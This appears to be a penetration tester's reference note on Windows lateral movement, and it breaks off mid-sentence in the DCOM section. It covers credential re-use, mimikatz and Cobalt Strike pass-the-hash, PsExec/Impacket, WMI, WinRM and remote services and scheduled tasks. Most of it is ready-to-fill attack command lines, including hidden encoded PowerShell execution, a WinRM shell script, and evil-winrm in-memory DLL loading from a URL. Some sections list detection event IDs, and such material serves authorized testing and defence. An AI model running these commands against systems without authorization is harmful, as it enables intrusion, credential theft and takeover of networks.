# Windows - Lateral movements

### Local credential re-use

The local re-use of credentials consist of starting a process on the local
system under the security context and privileges of the specified user.

This security context may be used to access resources on the present system as
well as moving laterally using various methods (remote Windows services or
scheduled taks, `WMI`, etc.) that can rely on the current user security
context.      

###### runas

Set the main DNS server on the attacking computer to the Domain Controller IP
address:

```
Control Panel -> Network and Internet -> Network and Sharing Center -> Change adapter setting -> right click on the adapter being used -> Properties -> Internet Protocol Version 4 (TCP/IPv4) -> Properties -> Set the Preferred DNS server field  
```

To authenticate locally as another user (with plaintext credentials) and
execute PowerShell commands, the `runas` utility can be used.

```
# runas
# Use /NetOnly on off-domain machines
runas /NetOnly /user:<DOMAIN>\<USERNAME> "<COMMAND> <COMMAND_ARGS>"
runas /NetOnly /user:<DOMAIN>\<USERNAME> powershell.exe
```

The `NetOnly` option will make `runas` execute on your local computer as the
currently logged on user, but any connections to other computers on the network
will be made using the user account specified.

###### Start-Process / Start-Job

The `Start-Process` and `Start-Job` PowerShell cmdlets can be used to start a
local process under the identify of another user.

To run the specified process in an elevated security context through a
interactive logon on a system with `User Account Control (UAC)` enabled, the
`-Verb RunAs` parameter, for `Run as administrator`, can be specified.

```
$secpasswd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $secpasswd)

Start-Process <cmd.exe | powershell.exe | ...> -Credential $creds
Start-Process <cmd.exe | powershell.exe | ...> -Credential $creds -Verb RunAs

$ProcessJob = Start-Job -ScriptBlock { <POWERSHELL> } -Credential $creds
Wait-Job $ProcessJob
Receive-Job -Job $ProcessJob
```

###### Cobalt Strike runas, runu, spawnas, spawnu and make_token

On `Cobalt Strike`, the `runas` and `spawnas` beacon commands can be used,
respectively, to locally run a command or start a beacon under the security
context of the specified user. Both commands rely on a clear password and
cannot be used to Pass-the-Hash.

The `runas` command can also be used in place of the `spawnas` command by
running the beacon deploying `PowerShell` one-liner, generated using the beacon
built-in function `Access -> One-liner`.

```
beacon> runas <. | DOMAIN>\<USERNAME> <PASSWORD> <COMMAND> <COMMAND_ARGS>

beacon> spawnas <. | DOMAIN>\<USERNAME> <PASSWORD> <LISTENER>
```

The `make_token` beacon command correspond to the `runas` `NetOnly` option but
cannot be used to create a process and run a specified program. The
`make_token` command will instead replace the `Logon Session` in the current
beacon Windows `Access Token`, which is used for network Windows
authentication, with the `make_token` provided credentials. The local system
access through the beacon will thus not be affected but access to resources
over the network will be made using the newly provided credentials.   

The change can be reverted using the beacon command `rev2self`.

```
beacon> make_token <. | DOMAIN>\<USERNAME> <PASSWORD>
```

If elevated privileges are obtained on a system, the `runu` beacon command can
be used to run an arbitrary command as a child of another process, effectively
running the command in the targeted process security context. Building on this
primitive, the `spawnu` beacon command spawn a beacon, through PowerShell,
under another process security context.

Both commands can be used to impersonate any connected user on the compromised
system, without the need of knowing their password or `NTLM` hash, as well as
elevate to `NT AUTHORITY\SYSTEM`.  

```
# beacon> ps

beacon> runu <PID> <COMMAND> <COMMAND_ARGS>

beacon> spawnu <PID> <LISTENER>
```

###### Mimikatz Pass-The-Hash

Require elevated privileges on the system.

The Pass-The-Hash module of `mimikatz` can be used to locally run a process
under another user identity using its `NTLM` hash.

```
# Default to /run:cmd.exe.
# Command can be any binary such as powershell.exe or mmc.exe for example.
# Specifying arguments is supported as well.
sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> /ntlm:<HASH_NTLM> /run:"<COMMAND>"
sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> [/aes128:<USER_AES128_KEY> | /aes256:<USER_AES256_KEY>] /run:"<COMMAND>"
```

###### Cobalt Strike (using Mimikatz) Pass-The-Hash

Require elevated privileges on the system.

On `Cobalt Strike`, the `mimikatz` / and `steal_token` beacon commands can be
used to start a process under the specified user identity, using its `NTLM`
hash, and steal then impersonate the newly created process token.

The `pth` beacon command will wrap the `mimikatz` Pass-the-hash command and,
similarly to the `make_token` beacon command, replace the `Logon Session` in
the current beacon Windows `Access Token`, in order to access resources over
the network using the provided user identity.

Any token change can be reverted using the beacon command `rev2self`.

```
# Both local and over the network impersonation
beacon> mimikatz sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> /ntlm:<HASH_NTLM> /run:"powershell -w hidden"
beacon> mimikatz sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> [/aes128:<USER_AES128_KEY> | /aes256:<USER_AES256_KEY>] /run:"powershell -w hidden"
  [...]
  PID <PID>

beacon> steal_token <PID>

# Over the network ("/NetOnly") impersonation
pth <. | DOMAIN>\<USERNAME> <HASH_NTLM>
```

###### PowerShell Credential option

Most of the PowerShell's `Remote Server Administration Tools (RSAT)` cmdlets
support the `Credential` option, to run the cmdlet as the specified user
account. An username or a `PSCredential` object can be used.

A similar mechanism is also implemented in the PowerShell `PowerSploit`
framework.

### Lateral movements

Multiples mechanisms and tools can be used to access computers remotely:

  - Using `PsExec` and psexec-like utilities that will create and run a service
    remotely over `SMB` (port 445) or `SMB` over `NetBIOS` (port 139).
  - Using `Windows Management Instrumentation (WMI)` (ports 135 or 445) or
    `Windows Remote Management (WinRM)` (HTTP based API on
    ports 5985 / 5986).
  - Through a graphical interface over `Remote Desktop Protocol (RDP)` (port
    3389). User must be part of the `Remote Desktop User` /
    `Utilisateurs du Bureau à distance` group on the targeted system.
  - Remotely creating a Windows `service` or a `scheduled task`.
  - Using third parties applications, notably used by IT support for remote
    help desk and support sessions.

To conduct `Pass-the-Hash` authentication the user account must moreover be the
built-in local `RID-500` Administrator account or be a domain account. Local
accounts `RID != 500` member of the `Administrators` / `Administrateurs` group
can only authenticate using plain text credentials since Microsoft update
`KB2871997`.   

To quickly identity which servers or workstations in the domain are exposing one
of the service above from your network standpoint, AD queries and `nmap` can be
used in combination (refer to the `[Active Directory] Methodology - Domain
Recon` note).

###### [Over SMB] PsExec-like utilities

`PsExec`-like utilities operate under the same general principle:
  - Upload of a binary on the targeted system, usually through the `ADMIN$` or
  `C$` Windows built-in `SMB` shares.
  - Execution of the uploaded binary through the creation and execution of a
  Windows service, leveraging the `Service Control Manager (SCM)` service
  through the `MSRPC` protocol (`SVCCTL` interface).

The aforementioned actions require the following elevated privileges on the
targeted system, usually given to members of the local `Administrators` group:
    - Write permission on any network share (both `NTFS` and `Share` write
      permission). `PsExec` however requires write permission to the `ADMIN$`
      share.
    - Permissions to create (`SC_MANAGER_CREATE_SERVICE`) and start
      (`SERVICE_QUERY_STATUS` + `SERVICE_START`) Windows services.  

The execution of a `PsExec`-like utility will notably, in addition to
`Security` `EID 4624` and `EID 4672` events, generate the following Windows
events:
  - `System` hive, `EID 7045: A service was installed in the system`.
  - `Security` starting from the Windows Server 2016 and Windows 10 operating
    systems, `EID 4697: A service was installed in the system`.
  - `System` hive, `EID 7036: The <SERVICE_NAME> service entered the
    <running/stopped> state`.

*PsExec*

The `PsExec` CLI utility, from the Microsoft `sysinternals` suite and signed by
Microsoft, can be used to execute commands, locally or remotely and under the
current user or specified user identity.

While the use of a more complete attack framework is recommended on the
attacking machine (such as `Cobalt Strike`, `CrackMapExec` or `Metasploit`),
`PsExec` may be uploaded on a compromised host in order to futher reach
segregated targets as it will not raise alerts against some anti-virus
solutions.

`PsExec` uses a named pipe over the `Server Message Block (SMB)` protocol,
which runs on `TCP` port 445. The utility will connect to the `ADMIN$` share of
the targeted host, upload the `PSEXESVC.exe` binary and use the `Service
Control Manager` to start the aforementioned binary.

Note that while the name of the created service can be specified, the name of
the uploaded binary cannot be changed, resulting in known forensics artefacts
on the accessed system associated to the use of `PsExec`, such as:
  - A Windows `Security` event `EID 4624: An account was successfully logged
    on` with its `Process Name`	field set to `C:\Windows\PSEXESVC.exe`.    
  - A `PSEXESVC.EXE` entry in the `Shimcache` / `Amcache`
  - A possible record in the `Master File Table (MFT)` and `Update Sequence
  Number Journal (USN) Journal`

```
# -s - Runs the remote process as the System account (NT AUTHORITY\SYSTEM).
# -h - If the targeted system is using the Windows Vista operating system, or higher, the created process will attempt to be run with the account's elevated token.
# -i - Runs the program so that it interacts with the desktop of the specified session on the remote system.
# -d - Do not wait for process to terminate (non-interactive).
# -r <SERVICE_NAME> - Specifies the name of the remote service to create. Default to PSEXESVC.

# Interactive commands execution through cmd or PowerShell
PsExec.exe -accepteula \\<HOST | IP> -s -i -d <cmd.exe | %ComSpec% | powershell.exe>
PsExec.exe -accepteula \\<HOST | IP> -u "<DOMAIN | WORKGROUP>\<USERNAME>" -p "<PASSWORD>" -s -i -d <cmd.exe | %ComSpec% | powershell.exe>

# Unitary command execution on one or multiple specified hosts.
# PsExec hosts specified file should be encoded in ANSI.
PsExec.exe -accepteula [\\<IP | HOSTNAME | IPS | HOSTNAMES> | @<FILE_FULL_PATH>]  -u "<DOMAIN | WORKGROUP>\<USERNAME>" -p "<PASSWORD>" -s <cmd.exe /c "<COMMAND> <COMMAND_ARGS>" | %ComSpec% /c "<COMMAND> <COMMAND_ARGS>" | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C "<COMMAND> <COMMAND_ARGS>" | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD> | ...>
```

*Metasploit PsExec*

The `exploit/windows/smb/psexec` `Metasploit` module can be used to execute a
`Metasploit` payload, such as a `Meterpreter`, on a targeted system using a
cleartext password or an `NTLM` hash.

This module will by default generate a service with a random name and
description and allows the specification of a network share.

```
# If using a password hash, set SMBPass to <LM_HASH:NT_HASH>
msf> use exploit/windows/smb/psexec
```

*Impacket psexec.py*

The `Impacket`'s `psexec.py` Python script will upload and execute the
`RemComSvc` service, based on the open-source `RemCom` project.

`psexec.py` present the advantage of supporting both `NTLM`, uisng a cleartext
password or an `NTLM` hash, and `Kerberos` authentication, using a
`Ticket-Granting Ticket (TGT)` or a `service ticket` for the remote machine
`CIFS` service. For more information on how to make use of `service tickets`
(`Pass-the-Ticket`), refer to the `[ActiveDirectory] Kerberos - silver tickets`
note.

`psexec.py` will by default upload a binary and generate a service with a
random name and allows the specification of a network share.

```
# --target-ip: Specifies the IP address of the targeted machine. If omitted, psexec.py will use the host or IP pecified in the target string. The option is useful when the target is an unresolvable NetBIOS name.

# NTLM authentication
psexec.py [-target-ip <TARGET_IP>] [-port [<PORT>]] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
psexec.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
psexec.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
```

Additionally, `psexec.py` can easily be incorporated into custom Python
scripts:

```
import psexec

psobject = psexec.PSEXEC("cmd.exe", "c:\\windows\\system32\\", None, "445/SMB", username = '<USERNAME>', password = '<PASSWORD>')
raw_result = psobject.run("<HOSTNAME | IP>")
print raw_result
psobject.kill();
```

*Invoke-SMBExec*

The `Invoke-SMBExec` PowerShell cmdlet can be used to pass the hash over SMB in
PowerShell.

The `Invoke-SMBExec` cmdlet will by default upload a binary and generate a
service with a random name.

```
Invoke-SMBExec -Target <HOSTNAME | IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLMHASH> -Command "<CMD>" -verbose
```

###### [Over SMB] *Fileless* PsExec-like utilities

The `Impacket`'s `smbexec.py` Python script and the `Metasploit`'s
`exploit/windows/smb/psexec` module implement a fileless variation of
`PsExec`. Instead of uploading a binary, the created Windows service will
execute Windows built-in binaries.

`smbexec.py` rely on `%COMSPEC%` (`cmd.exe`) and will, for each specified
command, create a Windows service that `echo` the command in a temporary file
(`%TEMP%\execute.bat`), then execute and ultimately delete the `bat` file.        

The `Metasploit`'s `exploit/windows/smb/psexec` module rely on both `%COMSPEC%`
and `powershell.exe` and will create a Windows service that execute the
specified payload (bind / reverse `meterpreter`, single command, etc.) through
a `PowerShell` one-liner.  

`Metasploit` will generate a random name for the Windows service while
`smbexec.py`, by default, create a service named `BTOBTO`.

```
# NTLM authentication
smbexec.py [-service-name <SERVICE_NAME>] [-target-ip <TARGET_IP>] [-port [<PORT>]] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
smbexec.py [-service-name <SERVICE_NAME>] -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
smbexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]

# If using a password hash, set SMBPass to <LM_HASH:NT_HASH>
msf> use exploit/windows/smb/psexec_psh
```

###### Over WMI

The `Windows Management Instrumentation (WMI)` is a Microsoft suite of tools
used to retrieve management data and manage Windows assets both locally and
over the network.  

`WMI` rely on two protocols when used over the network: `DCOM` (by default) and
`WinRM`. DCOM establishes an initial connection over TCP port 135 and any
subsequent data is then exchanged over a randomly selected TCP port.

`WMI` is divided in a collection of predefined classes. The `Win32_Process`
class can be used to start a process and the `Win32_Product` class can be used
to install an MSI installer package, both locally and remotely.

```
WMIC /NODE:<HOSTNAME | IP> COMPUTERSYSTEM GET USERNAME

# <COMMAND> example: <cmd.exe | powershell.exe | cmd.exe /c '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c '<COMMAND> <COMMAND_ARGS>' | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C '<COMMAND> <COMMAND_ARGS>' | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD> | ...>

Invoke-WmiMethod -Class Win32_Process -Name Create "<COMMAND>"
Invoke-WmiMethod -ComputerName <IP | HOSTNAME> -Credential <PSCredential> -Class Win32_Process -Name Create "<COMMAND>"
```

The `Invoke-WMIExec` PowerShell cmdlet and `Impacket`'s `wmiexec.py` can be
used to pass the hash over `WMI`. `wmiexec.py` additionally supports
authentication through the Kerberos protocol.

```
Invoke-WMIExec -Target <HOSTNAME | IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLMHASH> -Command "<CMD>" -verbose

# NTLM authentication
wmiexec.py [-target-ip <TARGET_IP>] [-port [<PORT>]] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
wmiexec.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
wmiexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
```

###### Over WinRM

*PowerShell's WinRM remoting*

`Windows Remote Management (WinRM)` is the Microsoft implementation of
WS-Management Protocol, a standard Simple Object Access Protocol
(`SOAP`)-based, protocol that allows hardware and operating systems, from
different vendors, to interoperate. By default, `WinRM` uses the `TCP` ports
5985 and 5986 for connections, respectively over `HTTP` and `HTTPS`. For more
information about `WinRM` itself, refer to the `L7 - 5985-5986 WSMan` note.

Multiples cmdlets are incorporated into the PowerShell core to execute commands
remotely through `WinRM`, also known as `PowerShell Remoting`. Through
`PowerShell Remoting`, unitary commands can be executed or full PowerShell
sessions can be established.

Members of the Windows built-in `Administrators` and `Remote Management Users`
groups are allowed, by default, to access a remote machine through `WinRM`:

```
(Get-PSSessionConfiguration -Name Microsoft.PowerShell).Permission
  NT AUTHORITY\INTERACTIVE AccessAllowed, BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users AccessAllowed
```  

Refer to the `[L7] 5985-5986 WSMan` note for the listing of the different
authentication mechanisms supported by `WinRM`.

`PowerShell Remoting` can be conducted through `HTTP` / `HTTPS` proxies, if
necessary. The proxy settings can be specified through the `Internet Options`
graphical utility and set as the system-wide `Microsoft Windows HTTP Services
(WinHTTP)` proxy using `netsh`.

```
Control Panel -> Internet Options -> Connections -> LAN settings
  "Use a proxy server for your LAN [...]" checked
  (Optional) "Bypass proxy server for local addresses" checked
  Advanced -> (For WinRM over HTTP, port TCP 5985) HTTP: <127.0.0.1 | HTTP_PROXY_IP> <HTTP_PROXY_PORT>
           -> (For WinRM over HTTPS, port TCP 5986) Secure: <127.0.0.1 | HTTPS_PROXY_IP> <HTTPS_PROXY_PORT>

netsh winhttp import proxy source=ie

# Lists the configured proxies.
netsh winhttp dump
  [...]
  set proxy proxy-server="http=<HTTP_PROXY_IP>:<HTTP_PROXY_PORT>;https=<HTTPS_PROXY_IP>:<HTTPS_PROXY_PORT>" bypass-list="<local>"

# Restore the WinHTTP default proxy settings (no proxies).
netsh winhttp reset proxy
```

```
$user = '<DOMAIN | WORKGROUP>\<USERNAME>';
$pass = '<PASSWORD>';
$spass = ConvertTo-SecureString -AsPlainText $pass -Force;
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList $user,$spass;

# Execute a single command
Invoke-Command -ComputerName <HOSTNAME | IP> -Credential $creds -ScriptBlock { <POWERSHELL> };

# Interactive PowerShell session
Enter-PSSession -ComputerName <HOSTNAME | IP> -Credential $creds

# WinRM over HTTP 5985
winrs /noprofile -r:<HOSTNAME | IP> -u:<DOMAIN | WORKGROUP>\<USERNAME> -p:<PASSWORD> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Enc [...]
# WinRM over HTTPS 5986
winrs /noprofile /usessl -r:<HOSTNAME | IP> -u:<DOMAIN | WORKGROUP>\<USERNAME> -p:<PASSWORD> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Enc [...]
```

To solve the "double hop" authentication problem, which occurs whenever trying
to access resources on a third server from the first remotely connected server,
the `CredSSP` authentication mechanism can be used. Simply put, the problem
happens because credentials are not allowed for delegation and thus can't be
passed whenever accessing network resources from the remotely connected system.
All access ends up being unauthenticated and results in `Access denied` errors.      

Supports for `CredSSP` must be activated and configured on the client attacking
system. The configuration below allows delegation to any system.

```
winrm quickconfig
Set-Item WSMan:localhost\client\trustedhosts -value *
Enable-WSManCredSSP -Role "Client" -DelegateComputer "*"

Start gpedit.msc
-> "Local Computer Policy" -> "Computer Configuration" -> "Administrative Templates" -> "System" -> "Credential Delegation"
-> In the "Settings" pane, "Allow Delegating Fresh Credentials with NTLM-only Server Authentication". -> "Enabled"
-> And in the "Options" area, "Show" -> "Value" = WSMAN/*
-> "Concatenate OS defaults with input above" checked
```

Once `CredSSP` is activated and correctly configured, the PowerShell cmdlets
`Invoke-Command` and `Enter-PSSession` can be used with the
`-Authentication CredSSP` option to make connections using `CredSSP`.

*WinRM remoting from Linux*

The following `ruby` script can be used to start a PowerShell session on a
distant Windows system through a `WinRM` service:

```ruby
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'http://<IP>:<PORT/wsman',
  transport: :ssl,
  user: '<USERNAME>',
  password: '<PASSWORD>',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end
```

Note that the script does not support `CredSSP` authentication and is thus
prone to the "double hop" authentication problem.

The `evil-winrm` `ruby` extend the code above with a number of functionality,
such as command history and completion, upload and download of files, loading
of in memory of `PowerShell` scripts, dll or `C#` binary, etc.

```
evil-winrm -u <USERNAME> -p '<PASSWORD' -i <HOSTNAME | IP> -s <LOCAL_PATH_PS_SCRIPTS> -e <LOCAL_PATH_EXE_SCRIPTS>
```

Supported commands:

| Command | Description |
|---------|-------------|
| download <REMOTE_PATH> <LOCAL_PATH> | Download remote file. LOCAL_PATH is not required |
| upload <LOCAL_PATH> <REMOTE_PATH> | Download remote file. |
| services | List Windows services and the associated binaries paths |
| <PS_NAME.ps1> | Load the specified PowerShell script in memory. The PowerShell script must be in the path set at -s argument **when the evil-winrm shell was started.** <br /> `menu` can be used to list the loaded cmdlets. |
| Invoke-Binary <LOCAL_BINARY_PATH> | Load the specified binary, compiled from `C#`, to be executed in memory. Accepts up to 3 arguments |
| l04d3r-LoadDll | Load dll libraries in memory, equivalent to: `[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("pwn.dll"))` |

```
l04d3r-LoadDll -smb -path \\<HOSTNAME | IP>\\<SHARE>\\<DLL>
l04d3r-LoadDll -local -path <LOCAL_DLL_PATH>
l04d3r-LoadDll -http -path http://<URL>/<DLL>
```

###### [Over SMB] Remote Windows services

The Windows built-in utility `Service Control (sc)` and the `Impacket`'s
`services.py` Python script can be used to remotely create and start a Windows
service.

Remote code execution can be achieved through a Windows service by:
    - Copying a binary to the targeted system and executing it through the
      service (`PsExec`-like).
    - Directly executing a one-liner or payload through a built-in Windows
      binary, such as `cmd.exe`.

Refer to the `[General] Shells` note for Windows reverse shell one-liners and
scripts.

Note that if the specified binary is not a service binary (i.e. a binary
implementing the `LPSERVICE_MAIN_FUNCTION` callback function), an error message
will be raised (`Error 1053: The service did not respond to the start or
control request in a timely fashion.`). The binary will however have been
executed once, which for some payload may be sufficient (`meterpreter`
notably).

```
# <SERVICE_COMMAND> example with a Windows binary: <cmd.exe /c '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c '<COMMAND> <COMMAND_ARGS>' |  %ComSpec% /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD> | ...>

sc \\<IP | HOSTNAME> create <SERVICE_NAME> binpath= "<SERVICE_COMMAND>"
sc \\<IP | HOSTNAME> start <SERVICE_NAME>

# NTLM authentication
services.py [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> create -name <SERVICE_NAME> -display <SERVICE_DISPLAY_NAME> -path '<SERVICE_COMMAND>'
services.py [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> <start | delete> -name <SERVICE_NAME>

services.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> create -name <SERVICE_NAME> -display <SERVICE_DISPLAY_NAME> -path '<SERVICE_COMMAND>'
services.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> <start | delete> -name <SERVICE_NAME>

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
services.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> create -name <SERVICE_NAME> -display <SERVICE_DISPLAY_NAME> -path '<SERVICE_COMMAND>'
services.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> <start | delete> -name <SERVICE_NAME>
```

###### Remote scheduled tasks

The Windows built-in utility `schtasks`, the `Impacket`'s `atexec.py`
Python script, and the Windows `Task Scheduler` graphical utility can be used
to remotely create and start a Windows scheduled tasks.

Remote code execution can be achieved through a Windows scheduled task by:
    - Copying a binary to the targeted system and executing it through the
      scheduled task.
    - Directly executing a one-liner or payload through a built-in Windows
      binary, such as `cmd.exe` or `powershell.exe`.

Refer to the `[General] Shells` note for Windows reverse shell one-liners and
scripts.

While `schtasks` does not have a "run now" option, a scheduled task can be
programmed to run once and starts in a few minutes. The `/Z` switch can be
specified to automatically delete the scheduled task after execution. It may
however raise compatibility issue, in which case the scheduled task would need
to be deleted manually.

`atexec.py` will create, run and immediately delete a scheduled task, by
default with a random generated name, that execute the specified command. The
scheduled task will be exectued as `NT AUTHORIT\SYSTEM`. The command output
will be stored in a temporary random file and retrieved through the `ADMIN$`
share.

The Windows `Task Scheduler` utility can be used to configure remote scheduled
task through the `Microsoft Management Console (MMC)` utility:

```
File -> Add/Remove Snap-in (Ctrl + M) -> Task Scheduler -> Add
Specification of the remote computer: Another computer -> (Optional) Connect as another user

Task Scheduler (<HOSTNAME>) -> Right click -> Create task...

  General -> Name
          -> Description
          -> Run whether user is logged on or not
          -> Hidden
          -> Run with highest privileges
          -> (Optional, to run as NT AUTHORITY\SYSTEM) Change User or Group... -> SYSTEM

  Actions -> New... -> Program/script: <cmd.exe | %ComSpec% | powershell.exe | BINARY>
          -> Add arguments (optional): <COMMAND_ARGS>

  Conditions -> Power -> Start the task only if the computer is on AC power -> Unchecked

Task Scheduler Library -> Right click on <TASK> -> Run / Delete  
```

The creation, execution and deletion of a scheduled task will notably, in
addition to `Security` `EID 4624` and `EID 4672` events, generate the following
Windows events:
  - `Microsoft-Windows-TaskScheduler/Operational` hive, `EID 106: User
    "<DOMAIN | HOSTNAME>\<USERNAME> | <SID>" registered Task Scheduler task
    "\<TASK_NAME>"`.

  - `Microsoft-Windows-TaskScheduler/Operational` hive, `EID 140: User
    "<DOMAIN | HOSTNAME>\<USERNAME> | <SID>" updated Task Scheduler task
    "\<TASK_NAME>"`.

  - `Microsoft-Windows-TaskScheduler/Operational` hive, `EID 141: User
    "<DOMAIN | HOSTNAME>\<USERNAME> | <SID>" deleted Task Scheduler task
    "\<TASK_NAME>"`.

  - `Microsoft-Windows-TaskScheduler/Operational` hive, `EID 129: Task
    Scheduler launch task "\<TASK_NAME>", instance "<INSTANCE>"  with process
    ID <PID>`.

  - `Microsoft-Windows-TaskScheduler/Operational` hive, `EID 100: Task
    Scheduler started "<INSTANCE>" instance of the "\<TASK_NAME>" task for
    user "NT AUTHORITY\SYSTEM | <DOMAIN | HOSTNAME>\<USERNAME> | <SID>"`.

  - `Microsoft-Windows-TaskScheduler/Operational` hive, `EID 140: User
    "<DOMAIN | HOSTNAME>\<USERNAME> | <SID>"  updated Task Scheduler task
    "\<TASK_NAME>"`.

  - `Security`, if `Audit object access` is enabled for `Success` and
    `Failure`, `EID 4698: A scheduled task was created`. Includes the scheduled
    task detailed configuration (author, triggers, executing user, command and
    eventual command argument, etc.) and can be correlated to a logon session
    using the event `Logon ID`.

  - `Security`, if `Audit object access` is enabled for `Success` and
    `Failure`, `EID 4702: A scheduled task was updated`. Specifies the user
    at the origin of the modification, the task name of the updated scheduled
    task and can be correlated to a logon session using the event `Logon ID`.

  - `Security`, if `Audit object access` is enabled for `Success` and
    `Failure`, `EID 4699: A scheduled task was deleted`. Specifies the user
    at the origin of the modification, the task name of the updated scheduled
    task and can be correlated to a logon session using the event `Logon ID`.

```
# <TASK_COMMAND> example with a Windows binary: <cmd.exe /c '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c '<COMMAND> <COMMAND_ARGS>' |  powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C '<COMMAND> <COMMAND_ARGS>' | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD> | ...>

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Enc [...]

# Create a scheduled task to run PowerShell code for example
schtasks /create /tn "<TASK_NAME>" /tr "<TASK_COMMAND>" /sc once /sd <MM/DD/YYYY> /st <HH:MM:SS> /V1 /Z /RU "NT AUTHORITY\SYSTEM" /S <IP | HOSTNAME>

# The creation and status of the scheduled task can be validated
schtasks /query /tn "<TASK_NAME>" /S <IP | HOSTNAME>
schtasks /run /tn "<TASK_NAME>" /S <IP | HOSTNAME>
schtasks /delete /tn "<TASK_NAME>" /S <IP | HOSTNAME>

# By default, atexec execute "cmd /C <COMMAND>"
# NTLM authentication
atexec.py [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> <TASK_COMMAND>
atexec.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> <TASK_COMMAND>

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
atexec.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> "<COMMAND | TASK_COMMAND>"
```

###### Distributed Component Object Model (DCOM)

`Component Object Model (COM)` is a Microsoft standard for inter-process
communication. `COM` specifies an object model and programming requirements
that enable `COM objects` (also called `COM components`) to interact with one
another. A `COM object` defines one, or more, sets of functions (`methods`),
called `interfaces`, that are the only way to manipulate the data associated
with the object. A `COM server` object provides services to `COM clients`
through its implemented `methods`, called by the clients after retrieving a
pointer to the `COM server` object interface.   

The proprietary Microsoft `Distributed Component Object Model (DCOM)`
technology allows for networked communication of `COM objects` over the
`Microsoft Remote Procedure Call (MSRPC)` protocol, with a first connection
initiated on the remote system port TCP 135.  

The `COM` / `DCOM` object register a few notable identifiers:
  - The `Class Identifier (CLSID)`, a `GUID` acting as a unique identifier for
  every `COM class` registered in Windows. The `CLSID key` in the registry
  points to the implementation of the class.
  - The optional `Programmatic Identifier (ProgID)`, that can supplement a
  `COM class` `CLSID` with a more human-readable name. Not every `COM class`
  is associated with a `ProgID`.
  - The `Application Identifier (AppID)`, which groups the configuration for
  one, or more, `DCOM objects` hosted by the same executable into one
